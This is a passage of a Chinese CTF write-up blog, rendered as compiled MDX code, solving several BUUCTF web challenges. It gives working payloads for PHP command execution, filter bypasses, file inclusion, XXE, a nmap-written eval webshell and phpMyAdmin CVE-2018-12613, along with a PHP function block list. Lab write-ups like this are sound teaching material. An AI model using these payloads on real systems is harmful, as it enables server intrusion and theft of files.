\u6731\u96c0\u7ec4]phpweb"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u8fd9\u4e2aform\u8868\u5355\u6bcf5\u79d2\u63d0\u4ea4\u4e00\u6b21"}),"\n",(0,i.jsx)(e.p,{children:"func\u7684\u503c\u4f20\u7684\u662f\u8981\u6267\u884c\u7684\u51fd\u6570\uff0cp\u7684\u503c\u8981\u4f20\u53c2\u6570"}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240203211841135.png",alt:"image-20240203211841135"})}),"\n",(0,i.jsx)(e.p,{children:"\u90a3\u4e48\u73b0\u5728\u5c31\u662f\u4e00\u9053\u4ee3\u7801\u6267\u884c\u9898\u76ee\u4e86"}),"\n",(0,i.jsx)(e.p,{children:"\u5148\u8bfb\u4e00\u4e0b\u5b83\u7684\u6e90\u4ee3\u7801"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"func=highlight_file&p=index.php\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u8fc7\u6ee4\u4e86n\u4e2a\u51fd\u6570"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:'<?php\r\n    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");\r\n    function gettime($func, $p) {\r\n        $result = call_user_func($func, $p); //\u8c03\u7528\u51fd\u6570\r\n        $a= gettype($result);\r\n        if ($a == "string") {\r\n            return $result;\r\n        } else {return "";}\r\n    }\r\n    class Test {\r\n        var $p = "Y-m-d h:i:s a";\r\n        var $func = "date";\r\n        function __destruct() {\r\n            if ($this->func != "") {\r\n                echo gettime($this->func, $this->p);\r\n            }\r\n        }\r\n    }\r\n    $func = $_REQUEST["func"];\r\n    $p = $_REQUEST["p"];\r\n\r\n    if ($func != null) {\r\n        $func = strtolower($func); //\u8f6c\u5c0f\u5199\r\n        if (!in_array($func,$disable_fun)) { //\u5224\u65ad\u662f\u5426\u5728\u9ed1\u540d\u5355\r\n            echo gettime($func, $p);\r\n        }else {\r\n            die("Hacker...");\r\n        }\r\n    }\r\n    ?>\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u4f7f\u7528"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"func=\\system&p=ls /  //system\u524d\u7684\\\u662f\u7ed5\u8fc7\u8fc7\u6ee4\u7684\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u6211\u4eec\u76f4\u63a5\u8fdb\u884cRCE\u4e86\uff0c\u4f46\u662fflag\u6ca1\u627e\u5230\uff0c\u6784\u9020"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"func=\\system&p=find / -name flag*\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5bfb\u627e\u6240\u6709\u6587\u4ef6\u540d\u5e26flag\u7684\u6587\u4ef6"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240203213605801.png",alt:"image-20240203213605801"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"func=\\system&p=cat /tmp/flagoefiu4r93\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u6700\u7ec8payload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-http",children:"POST /index.php HTTP/1.1\r\nHost: 9a058e9d-b9a1-49d5-878c-3b099db1d9cb.node5.buuoj.cn:81\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 37\r\nOrigin: http://9a058e9d-b9a1-49d5-878c-3b099db1d9cb.node5.buuoj.cn:81\r\nConnection: close\r\nReferer: http://9a058e9d-b9a1-49d5-878c-3b099db1d9cb.node5.buuoj.cn:81/index.php\r\nUpgrade-Insecure-Requests: 1\r\n\r\nfunc=\\system&p=cat /tmp/flagoefiu4r93\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u53e6\u4e00\u79cd\u65b9\u6cd5\uff08\u770b\u522b\u4eba\u7684\u89e3\u6cd5\uff09"}),"\n",(0,i.jsx)(e.p,{children:"\u6784\u9020\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u8fdb\u884c\u6267\u884c\uff08\u6709test\u7c7b\uff09"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:7:"\\system";}\n'})}),"\n",(0,i.jsx)(e.h2,{id:"bsidescf-2020had-a-bad-day",children:"[BSidesCF 2020]Had a bad day"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240216211203666.png",alt:"image-20240216211203666"})}),"\n",(0,i.jsxs)(e.p,{children:["\u6839\u636e\u62a5\u9519\u53d1\u73b0\u4f1a\u81ea\u5df1\u5728\u540e\u9762\u52a0\u4e0a",(0,i.jsx)(e.code,{children:".php"}),"\uff0c\u5229\u7528\u4f2a\u534f\u8bae\u8bfb\u53d6index.php"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"php://filter/read=convert.base64-encode/resource=index\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5f97\u5230\u6e90\u7801"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:'<?php\r\n\t$file = $_GET[\'category\'];\r\n\r\nif(isset($file))\r\n{\r\n\tif( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){\r\n\t\tinclude ($file . \'.php\');\r\n\t}\r\n\telse{\r\n\t\techo "Sorry, we currently only support woofers and meowers.";\r\n\t}\r\n}\r\n?>\n'})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.strong,{children:"strpos \u2014 \u67e5\u627e\u5b57\u7b26\u4e32\u9996\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e"})}),"\n",(0,i.jsx)(e.p,{children:"payload"}),"\n",(0,i.jsx)(e.p,{children:"\u5c1d\u8bd5\u8bfb\u53d6flag.php"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"php://filter/read=convert.base64-encode/index/resource=flag\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5f97\u5230flag"}),"\n",(0,i.jsx)(e.h2,{id:"bjdctf2020zjctf\u4e0d\u8fc7\u5982\u6b64",children:"[BJDCTF2020]ZJCTF\uff0c\u4e0d\u8fc7\u5982\u6b64"}),"\n",(0,i.jsx)(e.p,{children:"\u77e5\u8bc6\u70b9"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"preg_replace"}),"\u51fd\u6570\u7684/e\u6a21\u5f0f\u53ef\u4ee5\u6267\u884c\u4ee3\u7801"]}),"\n"]}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"${}"}),'\u662f\u53d8\u91cf\u5904\u4e8e""\u53cc\u5f15\u53f7\u5b57\u7b26\u4e32\u4e2d\u7684\u8f6c\u4e49\u7b26\uff0c\u624b\u518c\u53eb\u590d\u6742(\u82b1\u62ec\u53f7)\u8bed\u6cd5\r\n\u5728\u5b57\u7b26\u4e32\u4e2d\r\n',(0,i.jsx)(e.code,{children:'" $type {$type} ${type}"'}),"\r\n\u8fd9\u4e09\u4e2a\u4f5c\u7528\u76f8\u540c\uff0c\u540e2\u79cd\u7ed3\u5408\u4f7f\u7528\uff0c\u7528\u4e8e\u5f15\u7528\u590d\u6742\u53d8\u91cf\u548c\u907f\u514d\u6b67\u4e49\r\n\u6bd4\u5982",(0,i.jsx)(e.code,{children:"{${$type_name}}"}),"\u53d8\u91cf\u7684\u53d8\u91cf\r\n",(0,i.jsx)(e.code,{children:"$type_name='apple'; $apple=5; echo \"{${$type_name}}\";"})," \u663e\u793a5"]}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:"https://www.php.net/manual/zh/language.variables.variable.php",children:"\u53ef\u53d8\u53d8\u91cf"}),"\u7684\u4e00\u4e9b\u77e5\u8bc6\u70b9"]}),"\n"]}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.strong,{children:"\u53cd\u5411\u5f15\u7528"})}),"\n",(0,i.jsxs)(e.p,{children:["\u5bf9\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u6a21\u5f0f\u6216\u90e8\u5206\u6a21\u5f0f ",(0,i.jsx)(e.strong,{children:"\u4e24\u8fb9\u6dfb\u52a0\u5706\u62ec\u53f7"})," \u5c06\u5bfc\u81f4\u76f8\u5173 ",(0,i.jsx)(e.strong,{children:"\u5339\u914d\u5b58\u50a8\u5230\u4e00\u4e2a\u4e34\u65f6\u7f13\u51b2\u533a"})," \u4e2d\uff0c\u6240\u6355\u83b7\u7684\u6bcf\u4e2a\u5b50\u5339\u914d\u90fd\u6309\u7167\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u6a21\u5f0f\u4e2d\u4ece\u5de6\u5230\u53f3\u51fa\u73b0\u7684\u987a\u5e8f\u5b58\u50a8\u3002\u7f13\u51b2\u533a\u7f16\u53f7\u4ece 1 \u5f00\u59cb\uff0c\u6700\u591a\u53ef\u5b58\u50a8 99 \u4e2a\u6355\u83b7\u7684\u5b50\u8868\u8fbe\u5f0f\u3002\u6bcf\u4e2a\u7f13\u51b2\u533a\u90fd\u53ef\u4ee5\u4f7f\u7528 '\\n' \u8bbf\u95ee\uff0c\u5176\u4e2d n \u4e3a\u4e00\u4e2a\u6807\u8bc6\u7279\u5b9a\u7f13\u51b2\u533a\u7684\u4e00\u4f4d\u6216\u4e24\u4f4d\u5341\u8fdb\u5236\u6570\u3002"]}),"\n"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:'<?php\r\n\r\nerror_reporting(0);\r\n$text = $_GET["text"];\r\n$file = $_GET["file"];\r\nif(isset($text)&&(file_get_contents($text,\'r\')==="I have a dream")){\r\n    echo "<br><h1>".file_get_contents($text,\'r\')."</h1></br>";\r\n    if(preg_match("/flag/",$file)){\r\n        die("Not now!");\r\n    }\r\n\r\n    include($file);  //next.php\r\n    \r\n}\r\nelse{\r\n    highlight_file(__FILE__);\r\n}\r\n?>\n'})}),"\n",(0,i.jsx)(e.p,{children:"data\u534f\u8bae\u5199\u5185\u5bb9\uff0c\u8bfb\u53d6next.php\u7684\u5185\u5bb9"}),"\n",(0,i.jsx)(e.p,{children:"payload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"text=data://text/plain,I have a dream\r\n&file=php://filter/convert.base64-encode/resource=next.php\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5f97\u5230next.php\u7684\u5185\u5bb9"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\n$id = $_GET['id'];\r\n$_SESSION['id'] = $id;\r\n\r\nfunction complex($re, $str) {\r\n    return preg_replace(\r\n        '/(' . $re . ')/ei',\r\n        'strtolower(\"\\\\1\")',\r\n        $str\r\n    );\r\n}\r\n\r\n\r\nforeach($_GET as $re => $str) {\r\n    echo complex($re, $str). \"\\n\";\r\n}\r\n\r\nfunction getFlag(){\r\n\t@eval($_GET['cmd']);\r\n}\n"})}),"\n",(0,i.jsx)(e.p,{children:"payload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"\\S*=${phpinfo()} \u53ef\u4ee5\u6267\u884cphpinfo\r\n\u8fd9\u91cc\u6211\u4eec\u6267\u884cgetFlag\u8fd9\u4e2a\u51fd\u6570\r\n\\S*=${getFlag()}\u6216\\S*={${getFlag()}}\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u6700\u540e\u7684payload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"\\S*={${getFlag()}}&cmd=system('cat /flag');\n"})}),"\n",(0,i.jsx)(e.h2,{id:"buuctf-2018online-tool",children:"[BUUCTF 2018]Online Tool"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\n\r\nif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\r\n    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];\r\n}\r\n\r\nif(!isset($_GET['host'])) {\r\n    highlight_file(__FILE__);\r\n} else {\r\n    $host = $_GET['host'];\r\n    $host = escapeshellarg($host);\r\n    $host = escapeshellcmd($host);\r\n    $sandbox = md5(\"glzjin\". $_SERVER['REMOTE_ADDR']);\r\n    echo 'you are in sandbox '.$sandbox;\r\n    @mkdir($sandbox);\r\n    chdir($sandbox);\r\n    echo system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host);\r\n}\n"})}),"\n",(0,i.jsx)(e.p,{children:"X_FORWARDED_FOR\u548cREMOTE_ADDR\u662f\u670d\u52a1\u5668\u83b7\u53d6ip\u7684"}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u91cc\u548c\u8fd9\u4e2a\u6ca1\u5173\u7cfb\uff0c\u4e3b\u8981\u662fhost\u53c2\u6570"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"escapeshellarg()\u51fd\u6570"}),"\n",(0,i.jsx)(e.p,{children:"\u628a\u5b57\u7b26\u4e32\u8f6c\u7801\u6210\u53ef\u4ee5\u5728shell\u547d\u4ee4\u91cc\u4f7f\u7528\u7684\u53c2\u6570\uff0c\u5c06\u5355\u5f15\u53f7\u8fdb\u884c\u8f6c\u4e49\uff0c\u8f6c\u4e49\u4e4b\u540e\uff0c\u518d\u5728\u5de6\u53f3\u52a0\u5355\u5f15\u53f7\uff1b"}),"\n"]}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"escapeshellcmd()\u51fd\u6570"}),"\n",(0,i.jsx)(e.p,{children:"\u5bf9\u5b57\u7b26\u4e32\u4e2d\u53ef\u80fd\u4f1a\u6b3a\u9a97 shell \u547d\u4ee4\u6267\u884c\u4efb\u610f\u547d\u4ee4\u7684\u5b57\u7b26\u8fdb\u884c\u8f6c\u4e49,\u5c06"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"& # ; ` | * ? ~ < > ^ ( ) [ ]{ } $ \\ \u3001 \\x0A\u548c\\xFF\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u4ee5\u53ca\u4e0d\u914d\u5bf9`\u7684\u5355/\u53cc\u5f15\u53f7\u8f6c\u4e49\uff1b"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"\u53cd\u659c\u7ebf\uff08\\\uff09\u4f1a\u5728\u4ee5\u4e0b\u5b57\u7b26\u4e4b\u524d\u63d2\u5165\uff1a`&#;`|*?~<>^()[]{}$\\`\u3001\\x0A \u548c \\xFF\u3002 ' \u548c \"\u4ec5\u5728\u4e0d\u914d\u5bf9\u513f\u7684\u65f6\u5019\u88ab\u8f6c\u4e49\u3002\u5728 Windows \u5e73\u53f0\u4e0a\uff0c\u6240\u6709\u8fd9\u4e9b\u5b57\u7b26\u4ee5\u53ca % \u548c ! \u5b57\u7b26\u524d\u9762\u90fd\u6709\u4e00\u4e2a\u63d2\u5165\u7b26\u53f7\uff08^\uff09\u3002 \n"})}),"\n"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:'<?php\r\n    highlight_file(__FILE__);\r\n\t$host = $_GET[\'host\'];\r\n    echo $host."<br>";\r\n    $host = escapeshellarg($host);\r\n    echo $host."<br>";\r\n    $host = escapeshellcmd($host);\r\n    echo $host."<br>";\r\n?>\n'})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"\u4f20\u5165\r\n' <?php @eval($_POST[\"cmd\"]);?> -oG test.php '\r\n\u5229\u7528nmap\u7684\u547d\u4ee4\u6765\u505a\u4e00\u4e9b\u4e8b\r\n\u6709\u4e00\u4e2a\u53c2\u6570-oG\u53ef\u4ee5\u5c06\u547d\u4ee4\u548c\u7ed3\u679c\u5199\u5230\u540c\u4e00\u4e2a\u6587\u4ef6\u4e0a\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u7ed3\u679c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"' <?php @eval($_POST[\"cmd\"]);?> -oG test.php '\r\n''\\'' <?php @eval($_POST[\"cmd\"]);?> -oG test.php '\\'''\r\n''\\\\'' \\<\\?php @eval\\(\\$_POST\\[\"cmd\"\\]\\)\\;\\?\\> -oG test.php '\\\\'''\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5355\u5f15\u53f7\u5168\u90e8\u95ed\u5408\uff0c\u4e0a\u9762\u7684\u8bed\u53e5\u5c31\u662f"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'\\ <?php @eval($_POST["cmd"]);?> -oG test.php \\\\\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u5199\u8fdb\u53bb\u7684test.php\u5185\u5bb9\u5c31\u662f"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"nmap -T5 -sT -Pn --host-timeout 2 -F -oG test.php \\ <?php @eval($_POST[cmd]);?> \\\\\n"})}),"\n",(0,i.jsx)(e.h2,{id:"gxyctf2019\u7981\u6b62\u5957\u5a03",children:"[GXYCTF2019]\u7981\u6b62\u5957\u5a03"}),"\n",(0,i.jsx)(e.p,{children:"\u5229\u7528githack\u83b7\u53d6\u6e90\u7801"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240217162123197.png",alt:"image-20240217162123197"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\ninclude \"flag.php\";\r\necho \"flag\u5728\u54ea\u91cc\u5462\uff1f<br>\";\r\nif(isset($_GET['exp'])){\r\n    if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) {\r\n        if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) {\r\n            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {\r\n                // echo $_GET['exp'];\r\n                @eval($_GET['exp']);\r\n            }\r\n            else{\r\n                die(\"\u8fd8\u5dee\u4e00\u70b9\u54e6\uff01\");\r\n            }\r\n        }\r\n        else{\r\n            die(\"\u518d\u597d\u597d\u60f3\u60f3\uff01\");\r\n        }\r\n    }\r\n    else{\r\n        die(\"\u8fd8\u60f3\u8bfbflag\uff0c\u81ed\u5f1f\u5f1f\uff01\");\r\n    }\r\n}\r\n// highlight_file(__FILE__);\r\n?>\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u9996\u5148\u8fc7\u6ee4\u4e86\u4e00\u4e9b\u4f2a\u534f\u8bae\uff0c\u7136\u540e\u6709\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u6700\u540e\u8fc7\u6ee4\u4e86\u4e00\u4e9b\u5173\u952e\u5b57"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"/[a-z,_]+\\((?R)?\\)/\r\n(?R)?\u8868\u793a\u9012\u5f52\u6574\u4e2a\u5339\u914d\u6a21\u5f0f\r\n\u8fd9\u91cc\u53ea\u80fd\u4f20\u5165\u5982\uff0ca(b(c()));\u8fd9\u6837\u7684\u503c\uff0c\u6240\u4ee5\u8fd9\u662f\u4e00\u9053\u65e0\u53c2\u6570RCE\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"exp=print_r(scandir(current(localeconv()))); \u67e5\u770b\u5f53\u524d\u76ee\u5f55\u6587\u4ef6\uff0c\u6709flag.php\r\nexp=show_source(next(array_reverse(scandir(current(localeconv())))));\r\n\u7ffb\u8f6c\u6570\u7ec4\uff0c\u5229\u7528next\u53d6\u5c0f\u6807\u4e3a1\u7684\u5143\u7d20\uff0c\u67e5\u770b\u6e90\u7801\uff0c\u5f97\u5230flag\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5229\u7528session"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"?exp=print_r(session_id(session_start()));//session_start\u8868\u793a\u521d\u59cb\u5316session\uff0c\u5982\u679cheader\u91cc\u9762\u6ca1\u6709\u8bbe\u7f6e\u7684\u8bdd\u5219\u81ea\u5df1\u521b\u5efa;session_id\u83b7\u53d6session\uff0c\n"})}),"\n",(0,i.jsx)(e.p,{children:"payload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-http",children:"GET /?exp=show_source(session_id(session_start())); HTTP/1.1\r\nHost: c3963d62-08d4-4ff4-823b-f03368a8fa37.node5.buuoj.cn\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://c3963d62-08d4-4ff4-823b-f03368a8fa37.node5.buuoj.cn/?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));\r\nConnection: close\r\nCookie: PHPSESSID=flag.php\r\nUpgrade-Insecure-Requests: 1\n"})}),"\n",(0,i.jsx)(e.h2,{id:"nctf2019fake-xml-cookbook",children:"[NCTF2019]Fake XML cookbook"}),"\n",(0,i.jsx)(e.p,{children:"\u6293\u5305\u53d1\u73b0\u662fxxe\u6f0f\u6d1e"}),"\n",(0,i.jsx)(e.p,{children:"\u76f4\u63a5\u5f15\u5165\u5916\u90e8\u5b9e\u4f53\u8bfb\u53d6flag"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-http",children:"POST /doLogin.php HTTP/1.1\r\nHost: e304fe32-9df6-4e0c-aecd-2ac085749353.node5.buuoj.cn:81\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0\r\nAccept: application/xml, text/xml, */*; q=0.01\r\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/xml;charset=utf-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: 120\r\nOrigin: http://e304fe32-9df6-4e0c-aecd-2ac085749353.node5.buuoj.cn:81\r\nConnection: close\r\nReferer: http://e304fe32-9df6-4e0c-aecd-2ac085749353.node5.buuoj.cn:81/\r\n\r\n<!DOCTYPE test [\r\n<!ENTITY test SYSTEM 'file:///flag'>]>\r\n<user><username>&test;</username><password>1</password></user>\n"})}),"\n",(0,i.jsx)(e.h2,{id:"gwctf-2019\u6211\u6709\u4e00\u4e2a\u6570\u636e\u5e93",children:"[GWCTF 2019]\u6211\u6709\u4e00\u4e2a\u6570\u636e\u5e93"}),"\n",(0,i.jsx)(e.p,{children:"\u7206\u7834\u51fa\u6709phpmyadmin\u76ee\u5f55"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240217215624266.png",alt:"image-20240217215624266"})}),"\n",(0,i.jsx)(e.p,{children:"\u5f53\u524d\u7248\u672c\u662f4.8.1\u7684 CVE-2018-12613\u8fd9\u4e2a\u6f0f\u6d1e\u53ef\u4ee5\u5229\u7528"}),"\n",(0,i.jsx)(e.p,{children:"index.php\u4e2d\u7684\u4ee3\u7801"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"// If we have a valid target, let's load that script instead\r\nif (! empty($_REQUEST['target'])\r\n    && is_string($_REQUEST['target'])\r\n    && ! preg_match('/^index/', $_REQUEST['target'])\r\n    && ! in_array($_REQUEST['target'], $target_blacklist)\r\n    && Core::checkPageValidity($_REQUEST['target'])\r\n) {\r\n    include $_REQUEST['target'];\r\n    exit;\r\n}\r\n\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"$target_blacklist = array (\r\n    'import.php', 'export.php'\r\n);\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"    public static function checkPageValidity(&$page, array $whitelist = [])\r\n    {\r\n        if (empty($whitelist)) { //\u5224\u65ad\u662f\u5426\u7a7a\uff0c\u662f\u5c06$goto_whitelist\u8d4b\u503c\u7ed9\u4ed6\r\n            $whitelist = self::$goto_whitelist;\r\n        }\r\n        if (! isset($page) || !is_string($page)) {\r\n            return false;\r\n        }\r\n\r\n        if (in_array($page, $whitelist)) { //\u5224\u65ad\u662f\u5426\u5728\u767d\u540d\u5355\u4e2d\uff0c\u662f\u5219\u8fd4\u56detrue\r\n            return true;\r\n        }\r\n\r\n        $_page = mb_substr(\r\n            $page,\r\n            0,\r\n            mb_strpos($page . '?', '?') //\u622a\u53d6\uff0c\u4ece\u5f00\u59cb\u5230?\u7684\u5b57\u7b26\r\n        );\r\n        if (in_array($_page, $whitelist)) {\r\n            return true;\r\n        }\r\n\r\n        $_page = urldecode($page);\r\n        $_page = mb_substr(\r\n            $_page,\r\n            0,\r\n            mb_strpos($_page . '?', '?')\r\n        );\r\n        if (in_array($_page, $whitelist)) {\r\n            return true;\r\n        }\r\n\r\n        return false;\r\n    }\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u6211\u4eec\u7ed5\u8fc7\u8fc7\u6ee4\u8fdb\u884c\u6587\u4ef6\u5305\u542b\u5c31\u53ef\u4ee5"}),"\n",(0,i.jsx)(e.p,{children:"\u4e3b\u8981\u770bcheckPageValidity\u51fd\u6570"}),"\n",(0,i.jsx)(e.p,{children:"\u6211\u4eec\u6ee1\u8db3\u4e09\u4e2atrue\u4e2d\u7684\u4e00\u4e2a\u5c31\u884c(\u7b2c\u4e00\u4e2atrue\u6ca1\u6709\u7528)"}),"\n",(0,i.jsx)(e.p,{children:"payload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"phpmyadmin/index.php?target=db_datadict.php?/../../../../../flag\r\nphpmyadmin/index.php?target=db_datadict.php%3f/../../../../../flag\r\nphpmyadmin/index.php?target=db_datadict.php%253f/../../../../../etc/passwd\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u6211\u4eec\u8fd8\u53ef\u8fdb\u884csession\u5305\u542b"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsxs)(e.p,{children:["\u5728phpMyAdmin\u4e2d\u6267\u884c",(0,i.jsx)(e.code,{children:'select "<?php phpinfo();?>"'}),"\u8bed\u53e5\r\n\u7531\u4e8ephp\u7684",(0,i.jsx)(e.strong,{children:"session\u673a\u5236"}),"\uff0c\u8fd9\u6761\u8bed\u53e5\u4f1a\u5199\u5165\u670d\u52a1\u5668\u5bf9\u5e94\u7684session\u6587\u4ef6\u4e2d\r\n\u5728\u6d4f\u89c8\u5668\u4e2d\u67e5\u627ephpMyAdmin\u7684",(0,i.jsx)(e.strong,{children:"cookie\u503c"}),"\r\n\u5229\u7528\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u6267\u884c\u8fd9\u4e2asession\u6587\u4ef6\uff0c\u4ece\u800c\u6267\u884cphpinfo()"]}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"payload"}),"\n",(0,i.jsxs)(e.p,{children:["session\u4fdd\u5b58\u7684\u8def\u5f84\u4e00\u822c\u662f",(0,i.jsx)(e.code,{children:"/tmp/sess_xxx"}),"\uff0c\u9700\u8981\u770bphpinfo\u4e2d\u7684session.save_path\u914d\u7f6e\u9879"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"target=sql.php?/../../../../../../var/lib/php/sessions/sess_779hnmnumfm8vtjll0nc0ui8lj\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u5f53\u7136 